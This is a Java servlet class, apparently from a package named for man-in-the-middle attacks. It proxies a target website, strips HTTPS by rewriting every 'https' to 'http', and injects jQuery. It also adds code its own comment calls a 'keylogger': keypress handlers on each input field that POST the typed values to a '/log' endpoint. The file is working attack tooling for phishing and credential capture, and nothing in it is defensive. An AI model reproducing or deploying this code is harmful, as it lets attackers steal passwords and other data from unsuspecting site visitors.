package MIM;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.jsoup.*;
import org.jsoup.nodes.*;
import org.jsoup.nodes.Document.OutputSettings;
import org.jsoup.nodes.Entities.EscapeMode;
import org.jsoup.select.Elements;

public class WebsiteProcessor {
	private final String USER_AGENT = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36";
	public enum Protocol{HTTP,HTTPS};
	private List<String> cookies;
	String base;
	
	public String getBase(){
		return this.base;
	}
	public void setBase(String base){
		if(base!=null && base!=this.base){
			this.base = base;
		}
	}
	public void processRequest(HttpServletRequest request, HttpServletResponse response) throws IOException{
		String endPoint = request.getRequestURI();
		setBase(request.getParameter("url"));
		String url = getBase()+endPoint;
		String query = request.getQueryString();
		if(query!=null && !query.equals("null")){
			url+="?"+query;
		}
		String html = getRawResponseAndSetBasic(url,"GET",request,response);
		String modifiedHtml = processHTML(url, html, url.contains(".js"));
		response.getWriter().write(modifiedHtml);
	}
	public String processHTML(String url, String html,boolean isJS) throws MalformedURLException, IOException{
		//downgrade all links to http
		Pattern p = Pattern.compile("https");
		Matcher m = p.matcher(html);
		String html1 = m.replaceAll("http");
		
		if(isJS){
			return html1;
		}
		Document doc = Jsoup.parse(html1);
		
		//add jquery
		doc.head().prepend("<script src='http://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js'></script>");
		
		//downgrade all src href links to http
		Elements links = doc.select("img");
		links.addAll(doc.select("input"));
		links.addAll(doc.select("form"));
		for(Element l:links){
			String imgSrc = l.attr("src");
			if(!imgSrc.contains("//")){
				imgSrc = "http://"+getBase()+imgSrc;
			}
			l.attr("src", imgSrc);
		}
		
		//keylogger code
		Elements inputs = doc.select("input");
		for(Element input:inputs){
			if(input.attr("id")!=null && !input.attr("id").equals("")){
				String keyString ="'"+input.attr("id")+"'";
				String valueString = "$('#"+input.attr("id")+"').val()";
				String var = "var d = {url:'"+url+"',key:"+keyString+",value:"+valueString+"};";
				String ajaxString = "$.ajax({url:'/log',type: 'POST',data:d})";
				String complete = "<script> $( '#"+input.attr("id")+"' ).keypress(function() {"+
				var+
				ajaxString+
				"}) </script>";
				doc.append(complete);
			}
		}
		return doc.toString();
	}
	public String getRawResponseAndSetBasic(String url,String method,HttpServletRequest request, HttpServletResponse response) throws IOException{
		String link = "https://"+url;
		URL u = new URL(link);
		HttpURLConnection  conn = (HttpURLConnection) u.openConnection();
		conn.setReadTimeout(5000);
		conn.setRequestMethod(method);
		conn.setUseCaches(false);
		Map<String, String[]> params = request.getParameterMap();
		for(String key:params.keySet()){
			conn.addRequestProperty(key, params.get(key)[0]);
		}
		if(method.equals("POST")){
			conn.setDoOutput(true);
		}
		conn.setInstanceFollowRedirects( true );
		conn.setRequestProperty("User-Agent", USER_AGENT);
		conn.setRequestProperty("Accept",
			"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
		conn.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
		if (cookies != null) {
			for (String cookie : this.cookies) {
				conn.addRequestProperty("Cookie", cookie.split(";", 1)[0]);
			}
		}
		conn.connect();
        
        OutputStreamWriter wr = null;
        BufferedReader rd  = null;
        String line = null;
        StringBuilder sb = new StringBuilder();
        if(method.equals("POST")){
	       wr = new OutputStreamWriter(conn.getOutputStream());
	       wr.write("something");
	       wr.flush();
        }
        
        //read the result from the server
        rd  = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        
      
        while ((line = rd.readLine()) != null)
        {
            sb.append(line + '\n');
        }
        //copy cookie data
        
        return sb.toString();
	}
	public static <Q> String concatenate(Iterable<Q> i, String linkSymbol){
		String out = "";
		Iterator<Q> p = i.iterator();
		while(p.hasNext()){
			String strToAdd = p.next().toString();
			if(!strToAdd.equals("") && strToAdd!=null){
				out+=strToAdd;
				if(p.hasNext()){
					out+=" "+linkSymbol+" ";
				}
			}
		}
		return out;
	}
}
